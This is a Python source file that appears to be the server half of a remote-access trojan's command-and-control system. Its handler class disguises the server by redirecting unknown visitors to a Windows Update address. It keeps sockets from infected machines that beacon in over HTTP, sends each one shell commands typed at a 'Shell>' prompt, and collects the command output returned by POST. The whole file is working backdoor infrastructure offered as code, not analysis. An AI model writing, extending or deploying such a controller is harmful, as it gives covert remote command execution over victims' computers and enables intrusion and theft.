import socket
from RuntimeDatabase import RuntimeDatabase
from HttpResponse import HttpResponse
from HttpRequest import HttpRequest
import threading


class Handler:
    @staticmethod
    def handle_unknown_source(client_sock):
        """
        This function redirects client to official Microsoft website
        :param client_sock: socket for redirection
        :type client_sock: socket
        :return: None
        """
        response = HttpResponse.generate_redirect_response("http://www.windowsupdate.com/")
        client_sock.send(response.encode())
        client_sock.close()

    @staticmethod
    def handle_approved_source(client_sock, addr, request):
        """
        This function check if this is first time connection and handling it
        :param client_sock: socket of client
        :type client_sock: socket
        :param addr: ip address and port
        :type addr: tuple
        :param request: Http request object
        :type request: HttpRequest
        :return: None
        """
        if request.request_method == "GET":
            print("[+] Authentication succeed ->", addr)
            try:
                RuntimeDatabase.idle_connections_lock.acquire()
                RuntimeDatabase.idle_connections[addr[0]].close()  # Close previous socket
                RuntimeDatabase.idle_connections_lock.release()
            except KeyError:  # New connection
                RuntimeDatabase.idle_connections_lock.release()
            RuntimeDatabase.idle_connections_lock.acquire()
            RuntimeDatabase.idle_connections[addr[0]] = client_sock
            RuntimeDatabase.idle_connections_lock.release()
            Handler.handle_send_command(addr[0])
        if request.request_method == "POST":
            try:  # An other handler waiting for this request
                session_id = request.request_headers['Cookie'].split("=")[1]
                RuntimeDatabase.post_request_events_lock.acquire()
                RuntimeDatabase.post_request_events[session_id].set()
                RuntimeDatabase.post_request_events[session_id] = request
                RuntimeDatabase.post_request_events_lock.release()
            except KeyError:  # Unknown request target
                pass
            client_sock.send(HttpResponse.generate_response(200, "").encode())

    @staticmethod
    def handle_cpr():
        # TODO: It's require computer object- next sprint
        return True

    @staticmethod
    def handle_send_command(ip_address):
        if not Handler.handle_cpr():
            return
        command = input("Shell> ")
        RuntimeDatabase.idle_connections_lock.acquire()
        client_socket = RuntimeDatabase.idle_connections[ip_address]
        RuntimeDatabase.idle_connections_lock.release()
        client_socket.send(HttpResponse.generate_response(200, command, set_cookie="1").encode())
        wait_event = threading.Event()
        RuntimeDatabase.post_request_events_lock.acquire()
        RuntimeDatabase.post_request_events["1"] = wait_event
        RuntimeDatabase.post_request_events_lock.release()
        wait_event.wait()
        RuntimeDatabase.post_request_events_lock.acquire()
        request = RuntimeDatabase.post_request_events["1"]
        RuntimeDatabase.post_request_events.pop("1")
        RuntimeDatabase.post_request_events_lock.release()
        print(request.request_content)
